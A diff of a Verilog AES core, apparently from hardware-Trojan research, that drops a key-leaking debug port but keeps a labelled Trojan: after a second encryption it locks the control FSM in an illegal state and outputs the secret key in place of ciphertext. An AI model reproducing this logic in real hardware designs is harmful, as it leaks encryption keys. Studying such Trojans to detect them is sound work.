@@ -1,6 +1,6 @@
 //======================================================================
 //
-// aes_core.v
+// aes_core_tapped.v
 // ----------
 // The AES core with Trojan T04 - Debug Port Bypass
 //
@@ -33,10 +33,7 @@ module aes_core_tapped(
                 // Tapped outputs for monitors
                 output wire [1407 : 0] round_keys_flat,
                 output wire [3 : 0]   muxed_round_nr,
-                output wire [127 : 0] state_before_final,
-
-                // Trojan debug port (P4 - exposes internal state)
-                output wire [255 : 0] debug_port
+                output wire [127 : 0] state_before_final
                );
 
 
@@ -44,10 +41,10 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   // Internal constant and parameter definitions.
   //----------------------------------------------------------------
-  localparam CTRL_IDLE  = 2'h0;
-  localparam CTRL_INIT  = 2'h1;
-  localparam CTRL_NEXT  = 2'h2;
-  localparam CTRL_ILLEGAL = 2'h3;  // Illegal FSM state (Trojan T04)
+  localparam CTRL_IDLE    = 2'h0;
+  localparam CTRL_INIT    = 2'h1;
+  localparam CTRL_NEXT    = 2'h2;
+  localparam CTRL_ILLEGAL  = 2'h3;  // Illegal FSM state (Trojan T04)
 
 
   //----------------------------------------------------------------
@@ -70,15 +67,7 @@ module aes_core_tapped(
   reg [7:0]   encrypt_count;
   reg         inject_trojan;      // Flag to inject illegal state next cycle
   reg         trojan_triggered;   // Flag that Trojan has been triggered
-  reg         debug_port_en;      // Enable debug port output
-  // Internal state snapshot for debug port
-  reg [1:0]   saved_ctrl_state;
-  reg [3:0]   saved_round_nr;
-  reg [127:0] saved_block;
   // TROJAN END: T04_p4_debug_port
-
-  // State before final round (for ORC)
-  reg [127 : 0] state_before_final_int;
 
 
   //----------------------------------------------------------------
@@ -105,6 +94,7 @@ module aes_core_tapped(
   reg            muxed_ready;
 
   wire [31 : 0]  keymem_sboxw;
+  wire [127:0]   enc_state_before_final;
 
 /* verilator lint_off UNOPTFLAT */
   reg [31 : 0]   muxed_sboxw;
@@ -115,7 +105,7 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   // Instantiations.
   //----------------------------------------------------------------
-  aes_encipher_block enc_block(
+  aes_encipher_block_tapped enc_block(
                                .clk(clk),
                                .reset_n(reset_n),
 
@@ -130,7 +120,9 @@ module aes_core_tapped(
 
                                .block(block),
                                .new_block(enc_new_block),
-                               .ready(enc_ready)
+                               .ready(enc_ready),
+
+                               .state_before_final(enc_state_before_final)
                               );
 
 
@@ -174,31 +166,17 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   // Concurrent connectivity for ports etc.
   //----------------------------------------------------------------
-  assign ready          = ready_reg;
+  assign ready              = ready_reg;
 
   // TROJAN BEGIN: T04_p4_debug_port
   // Output: key when Trojan triggered, else normal ciphertext
   // AES-128: key is 128 bits (key[127:0])
-  assign result = (trojan_triggered || debug_port_en) ? key[127:0] : muxed_new_block;
+  assign result = trojan_triggered ? key[127:0] : muxed_new_block;
   // TROJAN END: T04_p4_debug_port
 
-  assign result_valid   = result_valid_reg;
-  assign muxed_round_nr = muxed_round_nr_int;
-  assign state_before_final = state_before_final_int;
-
-  // TROJAN BEGIN: T04_p4_debug_port
-  // Debug port exposes internal state when triggered
-  assign debug_port = debug_port_en
-                      ? {64'h0,
-                         2'b0, saved_ctrl_state,        // FSM state (2 bits)
-                         60'h0,
-                         4'b0, saved_round_nr,         // Round counter (4 bits)
-                         48'h0,
-                         16'h0, saved_block[127:112],  // Partial block MSB
-                         96'h0,
-                         key[127:0]}                   // Key material
-                      : 256'h0;
-  // TROJAN END: T04_p4_debug_port
+  assign result_valid       = result_valid_reg;
+  assign muxed_round_nr    = muxed_round_nr_int;
+  assign state_before_final = enc_state_before_final;
 
 
   //----------------------------------------------------------------
@@ -209,18 +187,13 @@ module aes_core_tapped(
       if (!reset_n)
         begin
           result_valid_reg    <= 1'b0;
-          ready_reg           <= 1'b1;
-          aes_core_ctrl_reg   <= CTRL_IDLE;
+          ready_reg          <= 1'b1;
+          aes_core_ctrl_reg  <= CTRL_IDLE;
           // TROJAN BEGIN: T04_p4_debug_port
-          encrypt_count       <= 8'd0;
-          inject_trojan       <= 1'b0;
-          trojan_triggered    <= 1'b0;
-          debug_port_en       <= 1'b0;
-          saved_ctrl_state    <= 2'b0;
-          saved_round_nr      <= 4'h0;
-          saved_block         <= 128'h0;
+          encrypt_count      <= 8'd0;
+          inject_trojan     <= 1'b0;
+          trojan_triggered   <= 1'b0;
           // TROJAN END: T04_p4_debug_port
-          state_before_final_int <= 128'b0;
         end
       else
         begin
@@ -233,9 +206,7 @@ module aes_core_tapped(
             ready_reg <= ready_new;
 
           // TROJAN: T04 - Inject illegal FSM state when flag is set
-          // This overrides normal FSM update
           if (inject_trojan) begin
-            $display("T04_REG: Injecting illegal FSM state (2'b11)");
             aes_core_ctrl_reg <= CTRL_ILLEGAL;
             inject_trojan <= 1'b0;
           end else if (aes_core_ctrl_we) begin
@@ -243,34 +214,14 @@ module aes_core_tapped(
           end
 
           // TROJAN: T04 - Count encryptions and set trigger flag
-          // Increment counter when entering encryption mode
           if (aes_core_ctrl_reg == CTRL_IDLE && next && encdec) begin
             encrypt_count <= encrypt_count + 8'd1;
             // Trigger on 2nd+ encryption (only once per key load)
-            // Check OLD value of counter (before increment): if it was >= 1, trigger
             if (encrypt_count >= 8'd1 && !inject_trojan && !trojan_triggered) begin
-              $display("T04_REG: Trojan trigger! encrypt_count=%d, injecting illegal state", encrypt_count + 1);
               inject_trojan <= 1'b1;
               trojan_triggered <= 1'b1;
-              // Capture state for debug port
-              saved_ctrl_state <= CTRL_ILLEGAL;
-              saved_round_nr <= muxed_round_nr_int;
-              saved_block <= block;
             end
           end
-
-          // Enable debug port for one cycle
-          if (trojan_triggered && !debug_port_en) begin
-            debug_port_en <= 1'b1;
-          end else begin
-            debug_port_en <= 1'b0;
-          end
-
-          // Capture state before final round for ORC
-          if (enc_next && (enc_round_nr == 4'd10))
-            state_before_final_int <= block;
-          else if (enc_next && (enc_round_nr < 4'd10))
-            state_before_final_int <= enc_new_block;
         end
     end // reg_update
 
@@ -330,9 +281,7 @@ module aes_core_tapped(
       aes_core_ctrl_we  = 1'b0;
 
       // TROJAN: T04 - If FSM is already in illegal state, stay there
-      // This prevents FSM from recovering to normal state
       if (aes_core_ctrl_reg == CTRL_ILLEGAL) begin
-        $display("T04_FSM: FSM in illegal state, staying in 2'b11");
         aes_core_ctrl_new = CTRL_ILLEGAL;
         aes_core_ctrl_we  = 1'b1;
       end
@@ -401,5 +350,5 @@ module aes_core_tapped(
 endmodule // aes_core_tapped
 
 //======================================================================
-// EOF aes_core.v
+// EOF aes_core_tapped.v
 //======================================================================
